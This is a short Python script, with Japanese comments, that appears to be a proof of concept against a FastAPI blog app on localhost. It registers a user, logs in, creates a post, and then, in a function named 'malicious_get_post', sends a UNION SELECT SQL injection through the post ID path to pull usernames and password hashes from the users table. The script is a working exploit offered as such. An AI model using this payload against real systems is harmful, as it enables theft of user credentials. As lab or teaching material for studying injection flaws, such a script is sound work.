import requests
import secrets
import string

# APIのベースURL
BASE_URL = "http://localhost:8000"  # FastAPIのデフォルトのアドレスとポート

def generate_random_string(length: int) -> str:
    alphabet = string.ascii_letters + string.digits
    return ''.join(secrets.choice(alphabet) for i in range(length))

# ユーザー登録
def register_user(username, password):
    payload = {"username": username, "password": password}
    response = requests.post(f"{BASE_URL}/user/register/", json=payload)
    return response.json()

# ログイン
def login_user(username, password):
    data = {
        "username": username,
        "password": password,
        "grant_type": "", 
        "scope": "", 
        "client_id": "", 
        "client_secret": ""
    }
    response = requests.post(f"{BASE_URL}/user/login/", data=data)
    return response.json()["access_token"]

# 投稿作成
def create_post(title, content, token):
    headers = {"Authorization": f"Bearer {token}"}
    payload = {"title": title, "content": content}
    response = requests.post(f"{BASE_URL}/post/create", headers=headers, json=payload)
    return response.json()

# 投稿取得（SQLiを悪用してユーザ情報を取得）
def malicious_get_post(post_id):
    payload = f"{post_id} UNION SELECT id, username, hashed_password, 1 FROM users"
    response = requests.get(f"{BASE_URL}/post/{payload}")
    return response.json()

if __name__ == "__main__":
    # usernameとpasswordを生成
    username = generate_random_string(10)
    password = generate_random_string(10)

    # ユーザー登録
    user_info = register_user(username, password)
    print(f"Registered User: {user_info}")

    # ログイン
    token = login_user(username, password)
    print(f"Access Token: {token}")

    # 投稿作成
    post = create_post("Test Title", "Test Content", token)
    print(f"Created Post: {post}")

    # 投稿取得
    post = malicious_get_post(post["id"])
    print(f"Post: {post}")